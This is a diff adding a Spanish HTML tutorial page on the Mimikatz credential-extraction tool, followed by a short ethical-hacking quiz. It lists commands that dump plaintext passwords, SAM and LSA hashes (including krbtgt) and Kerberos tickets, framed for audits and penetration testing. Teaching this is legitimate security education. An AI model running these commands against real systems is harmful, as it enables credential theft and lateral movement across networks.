@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tutorial Mimikatz</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+
+        h1, h2 {
+            color: #333;
+        }
+
+        .command {
+            background-color: #333;
+            color: #fff;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-family: "Courier New", Courier, monospace;
+            display: block;
+        }
+
+        .section {
+            margin-bottom: 30px;
+        }
+
+        .exam {
+            background-color: #fff;
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 5px;
+        }
+
+        .exam input[type="text"], .exam textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .exam button {
+            background-color: #333;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .exam button:hover {
+            background-color: #555;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Tutorial de Mimikatz</h1>
+
+    <div class="section">
+        <h2>Introducción</h2>
+        <p>Mimikatz es una herramienta de código abierto utilizada para la extracción de credenciales en sistemas Windows. Es especialmente útil en auditorías de seguridad y pruebas de penetración. A continuación, exploraremos los comandos más comunes de Mimikatz y en qué situaciones se utilizan.</p>
+    </div>
+
+    <div class="section">
+        <h2>Comandos básicos de Mimikatz</h2>
+
+        <h3>1. Ejecutar Mimikatz con privilegios elevados</h3>
+        <p>Antes de usar Mimikatz, es necesario ejecutarlo con privilegios de administrador. Esto se hace normalmente desde una ventana de comandos elevada:</p>
+        <code class="command">mimikatz.exe</code>
+
+        <h3>2. Mostrar credenciales en texto plano</h3>
+        <p>Este comando muestra las credenciales almacenadas en la memoria en texto plano:</p>
+        <code class="command">privilege::debug</code>
+        <code class="command">sekurlsa::logonpasswords</code>
+
+        <h3>3. Exportar el archivo SAM y SYSTEM</h3>
+        <p>Estos comandos permiten extraer las bases de datos SAM y SYSTEM para realizar un análisis posterior:</p>
+        <code class="command">token::elevate</code>
+        <code class="command">lsadump::sam</code>
+
+        <h3>4. Recuperar hashes de contraseñas NTLM</h3>
+        <p>Este comando recupera los hashes NTLM de los usuarios del sistema:</p>
+        <code class="command">lsadump::lsa /inject /name:krbtgt</code>
+
+        <h3>5. Dump de tickets Kerberos</h3>
+        <p>Con este comando puedes volcar los tickets Kerberos activos en el sistema:</p>
+        <code class="command">sekurlsa::tickets</code>
+
+        <h3>6. Ejecutar Mimikatz desde PowerShell</h3>
+        <p>Es posible ejecutar Mimikatz directamente desde PowerShell con el siguiente comando:</p>
+        <code class="command">Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'</code>
+    </div>
+
+    <div class="section">
+        <h2>Guía de uso de Mimikatz</h2>
+        <p>Mimikatz es una herramienta poderosa y debe utilizarse con responsabilidad. Aquí se presentan algunos escenarios comunes en los que se podría utilizar:</p>
+
+        <h3>1. Auditoría de seguridad</h3>
+        <p>Un auditor de seguridad podría usar Mimikatz para verificar si las credenciales están adecuadamente protegidas en el sistema.</p>
+
+        <h3>2. Pruebas de penetración</h3>
+        <p>Durante una prueba de penetración, un pentester podría usar Mimikatz para obtener acceso adicional dentro de un sistema comprometido.</p>
+
+        <h3>3. Análisis forense</h3>
+        <p>En un escenario de análisis forense, Mimikatz puede ser útil para comprender cómo un atacante podría haber accedido a información sensible.</p>
+    </div>
+
+    <div class="section exam">
+        <h2>Examen de Hacking Ético</h2>
+        <p>Responde las siguientes preguntas basadas en el tutorial anterior:</p>
+
+        <label for="question1">1. ¿Cuál es el comando para mostrar credenciales en texto plano?</label>
+        <input type="text" id="question1">
+
+        <label for="question2">2. ¿En qué situaciones usarías el comando <code class="command-inline">lsadump::sam</code>?</label>
+        <textarea id="question2"></textarea>
+
+        <label for="question3">3. Explica cómo Mimikatz puede ser usado de manera ética en una auditoría de seguridad.</label>
+        <textarea id="question3"></textarea>
+
+        <button onclick="submitExam()">Enviar Examen</button>
+
+        <p id="examResult" class="hidden">¡Gracias por completar el examen! Revisa tus respuestas y asegúrate de comprender los conceptos clave de Mimikatz.</p>
+    </div>
+
+    <script>
+        function submitExam() {
+            document.getElementById('examResult').classList.remove('hidden');
+        }
+    </script>
+
+</body>
+</html>
